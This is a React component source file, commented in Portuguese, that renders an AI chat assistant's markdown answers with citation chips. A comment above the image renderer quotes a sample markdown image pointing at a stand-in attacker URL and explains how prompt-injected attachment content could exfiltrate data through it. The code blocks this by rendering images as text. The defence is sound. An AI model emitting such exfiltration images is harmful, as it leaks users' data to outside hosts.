'use client';

import * as React from 'react';
import ReactMarkdown, { type Components } from 'react-markdown';
import remarkGfm from 'remark-gfm';
import { citationNumberFromHref, citeMarkersToLinks } from '@/lib/chat/citeMarkers';
import type { Citation, MarkdownBlock as MarkdownData } from '@/types/chat';
import { CitationChip } from '../CitationChip';

// Texto corrido, listas, tabelas e negrito herdam a cor da resposta (a
// bolha define --foreground); só título h3, ênfase e cabeçalho de tabela
// usam o tom secundário. Link fica no acento (text-ring passa 4,5:1 nos
// dois temas) e só ganha sublinhado no hover — sem troca de cor.
//
// react-markdown 10 passa `node` (hast) pra todo componente: tirar antes de
// espalhar as props, senão vira atributo node="[object Object]" no DOM.
//
// Os renderers ficam FORA do render (e o `a` num useMemo): função nova a
// cada render vira tipo de componente novo pro React, que remontaria cada
// chip de citação — e fecharia o popover aberto — a cada token do stream.

const REMARK_PLUGINS = [remarkGfm];

const BASE_COMPONENTS: Components = {
  h1: ({ children }) => (
    <h1 className="text-base leading-6 font-semibold text-inherit mt-3 mb-1.5 first:mt-0">{children}</h1>
  ),
  h2: ({ children }) => <h2 className="text-sm font-semibold text-inherit mt-3 mb-1.5 first:mt-0">{children}</h2>,
  h3: ({ children }) => (
    <h3 className="text-xs leading-[18px] font-semibold text-muted-foreground mt-2 mb-1 first:mt-0">{children}</h3>
  ),
  p: ({ children }) => <p className="my-2 first:mt-0 last:mb-0 text-inherit">{children}</p>,
  strong: ({ children }) => <strong className="font-semibold text-inherit">{children}</strong>,
  em: ({ children }) => <em className="not-italic text-muted-foreground">{children}</em>,
  ul: ({ children }) => <ul className="my-2 first:mt-0 last:mb-0 ml-4 list-disc space-y-1 text-inherit">{children}</ul>,
  ol: ({ children }) => (
    <ol className="my-2 first:mt-0 last:mb-0 ml-4 list-decimal space-y-1 text-inherit">{children}</ol>
  ),
  li: ({ children }) => <li className="text-inherit">{children}</li>,
  // Bloco de código: o <pre> desenha a caixa; o <code> de dentro
  // perde o estilo de código inline.
  pre: ({ children }) => (
    <pre className="my-2 first:mt-0 last:mb-0 overflow-x-auto rounded-md border border-border bg-background p-3 text-xs leading-[18px] text-inherit font-[family-name:var(--f-code)] [&>code]:border-0 [&>code]:bg-transparent [&>code]:p-0 [&>code]:text-inherit">
      {children}
    </pre>
  ),
  code: ({ children, node: _node, className: _className, ...props }) => (
    <code
      className="rounded-sm border border-border bg-background px-1 py-px text-[0.85em] text-ring font-[family-name:var(--f-code)]"
      {...props}
    >
      {children}
    </code>
  ),
  // Imagem NUNCA carrega: conteúdo de anexo/base pode injetar
  // `![](https://atacante/?dados=…)` e o browser vazaria o dado só de pintar
  // a resposta (prompt injection → exfiltração). Vira texto.
  img: ({ alt }) => <span className="text-muted-foreground">[imagem{alt ? `: ${alt}` : ''}]</span>,
  table: ({ children }) => (
    <div className="my-2 first:mt-0 last:mb-0 overflow-x-auto rounded-md border border-border">
      <table className="w-full border-collapse text-sm text-inherit tabular-nums">{children}</table>
    </div>
  ),
  th: ({ children, node: _node, ...props }) => (
    <th
      className="border-b border-border bg-card px-3 py-2 text-left text-xs font-medium text-muted-foreground whitespace-nowrap"
      {...props}
    >
      {children}
    </th>
  ),
  td: ({ children, node: _node, ...props }) => (
    <td className="border-b border-border px-3 py-2 text-inherit tabular-nums [tr:last-child>&]:border-b-0" {...props}>
      {children}
    </td>
  ),
  blockquote: ({ children }) => (
    <blockquote className="border-l-2 border-ring/50 pl-3 my-2 first:mt-0 last:mb-0 text-muted-foreground">
      {children}
    </blockquote>
  ),
  hr: () => <hr className="my-3 border-border" />,
};

// Citações: o texto traz ` [[cite:n]]`; citeMarkersToLinks troca por link
// com href reservado e o renderer `a` desenha o CitationChip (só pra n que
// existe em `citations` — marcador forjado some).
export function MarkdownBlock({
  block,
  streaming,
  citations,
}: {
  block: MarkdownData | { content: string };
  streaming?: boolean;
  citations?: Citation[] | null;
}) {
  const byNumber = React.useMemo(() => new Map((citations ?? []).map((c) => [c.n, c])), [citations]);
  const content = React.useMemo(
    () => citeMarkersToLinks(block.content, new Set(byNumber.keys())),
    [block.content, byNumber],
  );
  const components = React.useMemo<Components>(
    () => ({
      ...BASE_COMPONENTS,
      a: ({ children, node: _node, ...props }) => {
        const n = citationNumberFromHref(props.href);
        if (n != null) {
          const c = byNumber.get(n);
          // href reservado sem fonte (escrito pelo próprio modelo): texto puro.
          return c ? <CitationChip citation={c} /> : <>{children}</>;
        }
        return (
          <a
            {...props}
            className="text-ring underline-offset-2 hover:underline hover:text-ring"
            target="_blank"
            rel="noopener noreferrer"
          >
            {children}
          </a>
        );
      },
    }),
    [byNumber],
  );

  return (
    <div className="text-sm leading-[22px] text-inherit break-words">
      <ReactMarkdown remarkPlugins={REMARK_PLUGINS} components={components}>
        {content}
      </ReactMarkdown>
      {streaming && (
        <span
          aria-hidden
          className="inline-block w-1.5 h-4 bg-ring animate-pulse motion-reduce:animate-none ml-0.5 -mb-0.5"
        />
      )}
    </div>
  );
}
